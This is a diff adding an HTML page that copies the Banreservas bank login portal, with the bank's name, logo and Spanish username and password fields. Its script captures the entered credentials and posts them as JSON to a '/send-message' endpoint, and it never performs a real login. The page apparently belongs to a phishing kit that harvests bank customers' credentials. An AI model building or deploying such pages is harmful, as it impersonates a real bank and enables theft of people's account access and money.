@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banreservas</title>
+    <link rel="stylesheet" href="/css/styles.css" type="text/css">
+</head>
+<body>
+    <header>
+        <ul>
+            <li class="link">Contactenos</li>
+            <li class="link">Idioma</li>
+            <li class="link">Ayuda</li>
+            <li class="link active">Banreservas.com</li>
+        </ul>
+    </header>
+    <img src="/img/logo_banreservas.png" alt="" srcset="" class="logo">
+    <div class="container">
+        <div class="form">
+            <p>Bienvenidos a tu banco Personas</p>
+            <div id="error" class="error"></div>
+            <form method="post" id="loginForm">
+                <div class="input-group">
+                    <label for="username">Ingrese usuario</label>
+                    <input type="text" name="username" id="username" placeholder="USUARIO">
+                </div>
+                <div class="input-group">
+                    <label for="password">Ingrese contraseña</label>
+                    <input type="password" name="password" id="password" placeholder="CONTRASEÑA">
+                </div>
+                <input type="submit" value="Continuar" class="input-group button">
+            </form>
+        </div>
+        <div class="form-img">
+            <img src="/img/profilepersonas.jpg" alt="" srcset="">
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorDiv = document.getElementById('error');
+
+            // Limpiar mensaje de error previo
+            errorDiv.textContent = '';
+            errorDiv.style.display = 'none';
+
+            // Validación básica
+            if (!username || !password) {
+                errorDiv.textContent = 'Por favor, complete todos los campos';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            // Preparar datos para enviar como JSON
+            const data = {
+                username: username,
+                password: password
+            };
+
+            // Enviar solicitud POST
+            fetch('/send-message', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    // Intenta leer el mensaje de error del cuerpo de la respuesta
+                    return response.text().then(errorText => {
+                        throw new Error(errorText || 'Error en la autenticación');
+                    });
+                }
+                // Intenta parsear la respuesta como JSON o texto
+                return response.text();
+            })
+            .then(responseData => {
+                // Manejar respuesta exitosa
+                console.log('Inicio de sesión exitoso: ' + responseData);
+                // Aquí podrías redirigir o realizar otras acciones
+            })
+            .catch(error => {
+                // Manejar errores de red o del servidor
+                errorDiv.textContent = error.message || 'Error desconocido';
+                errorDiv.style.display = 'block';
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
